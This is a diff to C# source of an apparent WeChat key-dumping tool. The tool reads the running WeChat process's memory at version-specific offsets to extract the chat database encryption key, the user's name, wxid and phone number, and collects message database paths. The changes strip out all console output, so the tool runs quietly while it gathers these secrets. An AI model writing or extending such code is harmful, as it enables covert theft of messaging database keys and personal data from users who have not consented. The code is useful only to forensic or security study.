@@ -25,9 +25,6 @@ namespace WeChatGetKey
 			{
 				List<string> msgDbs = new List<string>();
                 List<string> microMsgDbs = new List<string>();
-
-
-
                 Wxmsg msg = new Wxmsg();
 				WeChatProcess = ProcessesName;
 				Console.WriteLine("[+] WeChatProcessPID: " + WeChatProcess.Id.ToString());
@@ -45,15 +42,11 @@ namespace WeChatGetKey
                           
                             if (name.Contains("\\MicroMsg.db"))
 							{
-                                Console.WriteLine($"{DBPath}");
-
                                 microMsgDbs.Add(DBPath);
 								
                             }
                             else if (mc.Count != 0)
 							{
-                                Console.WriteLine($"{DBPath}");
-
                                 msgDbs.Add(DBPath);
                             }
                         }
@@ -66,11 +59,11 @@ namespace WeChatGetKey
 					{
 						WxdumpUtil.WeChatWinBaseAddress = processModule.BaseAddress;
 						string FileVersion = processModule.FileVersionInfo.FileVersion;
-						Console.WriteLine("[+] WeChatVersion: " + FileVersion);
+						
 
 						if (!WxdumpUtil.VersionList.TryGetValue(FileVersion, out SupportList))
 						{
-							Console.WriteLine("[-] WeChat Current Version Is: " + FileVersion + " Not Support");
+							
 							continue;
 						}
 						else
@@ -91,7 +84,7 @@ namespace WeChatGetKey
 					string HexKey = WxdumpUtil.GetHex(WeChatProcess.Handle, (IntPtr)WeChatKey);
 					if (string.IsNullOrWhiteSpace(HexKey))
 					{
-						Console.WriteLine("[-] WeChat Is Run, But Maybe No Login");
+		
                         continue;
                     }
 					else
@@ -99,36 +92,29 @@ namespace WeChatGetKey
 						Int64 WeChatName = (Int64)WxdumpUtil.WeChatWinBaseAddress + SupportList[0];
 						string name=WxdumpUtil.GetName(WeChatProcess.Handle, (IntPtr)WeChatName, 100);
 
-                        Console.WriteLine("[+] WeChatName: " +name );
+                       
 						msg.name = name;
 						Int64 WeChatAccount = (Int64)WxdumpUtil.WeChatWinBaseAddress + SupportList[1];
 						string Account = WxdumpUtil.GetMobile(WeChatProcess.Handle, (IntPtr)WeChatAccount);
-						if (string.IsNullOrWhiteSpace(Account))
+						if (!string.IsNullOrWhiteSpace(Account))
 						{
-							Console.WriteLine("[-] WeChatAccount: Maybe User Is No Set Account");
-						}
-						else
-						{
+						
 							string account=WxdumpUtil.GetAccount(WeChatProcess.Handle, (IntPtr)WeChatAccount, 100);
 
-                            Console.WriteLine("[+] WeChatAccount: " + account);
+                          
 							msg.wxid = account;
 
 						}
 						Int64 WeChatMobile = (Int64)WxdumpUtil.WeChatWinBaseAddress + SupportList[2];
 						string Mobile = WxdumpUtil.GetMobile(WeChatProcess.Handle, (IntPtr)WeChatMobile);
-						if (string.IsNullOrWhiteSpace(Mobile))
-						{
-							Console.WriteLine("[-] WeChatMobile: Maybe User Is No Binding Mobile");
-						}
-						else
+						if (!string.IsNullOrWhiteSpace(Mobile))
 						{
 							string phone=WxdumpUtil.GetMobile(WeChatProcess.Handle, (IntPtr)WeChatMobile, 100);
 
-                            Console.WriteLine("[+] WeChatMobile: " +phone);
+                   
 						}
 						
-						Console.WriteLine("[+] WeChatKey: " + HexKey);
+						
 						msg.key = HexKey;
 						
 					}
